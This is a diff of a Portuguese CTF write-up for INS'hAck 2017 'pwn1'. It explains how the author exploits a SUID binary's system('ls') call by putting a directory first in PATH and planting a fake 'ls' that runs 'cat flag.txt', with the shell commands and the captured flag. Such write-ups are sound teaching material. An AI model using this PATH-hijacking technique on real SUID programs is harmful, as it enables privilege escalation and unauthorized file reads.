@@ -28,7 +28,7 @@ Dentro do arquivo zipado há um elf executável chamado <strong><em>lseasy</em
 
 Ao se executar o binário pela primeira vez, se percebe que ele apenas lista os arquivos do diretório atual. Uma olhada no código fonte<strong><em> </em></strong>confirma que essa é sua única função:
 
-https://gist.github.com/anonymous/537b9729bb928e98d5af400aae650168
+<script src="https://gist.github.com/anonymous/537b9729bb928e98d5af400aae650168.js"></script>
 
 Não há muito o que explicar. Perdi tempo tentando variadas maneiras ler a flag. Logo estava lendo a <a href="http://man7.org/linux/man-pages/man3/system.3.html">manpage da função system</a>. Parecia ser a única coisa restante a ser explorada. Na seção de notas encontrei um aviso que dizia para não usa-la em programas SUID porque valores das variáveis de ambiente podiam ser usados para subverter o sistema. Ok, é exatamente o objetivo. Mas a nota não dizia como fazer isso.
 
@@ -37,13 +37,11 @@ Pesquisei por "exploit system call" no google e encontrei um<a href="https://www
 O segredo é que system vai procurar pelo binário nos caminhos contidos na <a href="https://www.vivaolinux.com.br/artigo/O-que-e-PATH-como-funciona-e-como-trabalhar-com-ele">variável de sistema <strong>PATH</strong></a>. E, como nada impede a alteração desta variável, é possível adicionar um caminho arbitrário.
 
 ```
-
 brenno@budweiser:~/Docs/ctf/inshack2017/pwn1$ echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
 brenno@budweiser:~/Docs/ctf/inshack2017/pwn1$ PATH=$HOME/Docs/ctf/inshack2017/pwn1:$PATH
 brenno@budweiser:~/Docs/ctf/inshack2017/pwn1$ echo $PATH
 /home/brenno/Docs/ctf/inshack2017/pwn1:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
-
 ```
 
 O primeiro comando printa minha variável PATH atual, no segundo eu adiciono o caminho "$HOME/Docs/ctf/inshack2017/pwn1" no ínicio da varíavel de sistema e o terceiro printa o conteúdo alterado.
@@ -51,7 +49,6 @@ O primeiro comando printa minha variável PATH atual, no segundo eu adiciono o 
 Agora, sempre que system for procurar o binário de ls, vai olhar primeiro dentro de "$HOME/Docs/ctf/inshack2017/pwn1". E é onde criei um ls mais coerente com meu objetivo.
 
 ```
-
 brenno@budweiser:~/Docs/ctf/inshack2017/pwn1$ cat ls.c
 #include stdio.h
 
@@ -65,9 +62,6 @@ brenno@budweiser:~/Docs/ctf/inshack2017/pwn1$ ./lseasy
 The content of the current folder is :
 INSA{SySt3m_1s_3v1l_-}
 brenno@budweiser:~/Docs/ctf/inshack2017/pwn1$
-
 ```
 
 Na primeira parte criei um simples programa em C usando a mesma função system para executar o comando <strong>cat flag.txt</strong>. Então o compilei dando o nome de ls e, ao executar o binário lseasy pode-se ver que ao invés de imprimir o conteúdo da pasta, ele imprime o conteúdo de flag.txt.
-
-
